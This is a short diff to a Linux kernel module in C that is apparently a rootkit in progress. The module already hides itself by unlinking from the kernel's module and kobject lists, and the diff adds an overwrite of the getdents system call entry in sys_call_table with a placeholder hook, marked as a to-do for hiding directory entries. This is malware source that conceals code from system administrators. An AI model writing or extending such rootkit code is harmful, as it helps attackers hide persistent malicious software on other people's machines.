@@ -10,6 +10,12 @@ static struct list_head *module_kobj_previous;
 static int temp;
 static char desc[50];
 
+extern void* sys_call_table[];
+
+static int getdents_hook() {
+	return 0;
+}
+
 void module_hide(void) {
 		/* The module is already hidden, do nothing. */
 		if(module_hidden) return;
@@ -17,7 +23,9 @@ void module_hide(void) {
 		module_previous = THIS_MODULE->list.prev;
 		list_del(&THIS_MODULE->list);
 		module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-		kobject_del(&THIS_MODULE->mkobj.kobj);
+		//kobject_del(&THIS_MODULE->mkobj.kobj);
+		// To do : hook getdents
+		sys_call_table[SYS_getdents] = getdents_hook;
 		list_del(&THIS_MODULE->mkobj.kobj.entry);
 		module_hidden = !module_hidden;
 		printk(KERN_INFO "Module hidden\n");
@@ -28,7 +36,8 @@ void module_show(void) {
 		if(!module_hidden) return;
 
 		list_add(&THIS_MODULE->list, module_previous);
-		kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
+		//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME);
+		list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_previous);
 		module_hidden = !module_hidden;
 		printk(KERN_INFO "Module no longer hidden\n");
 }
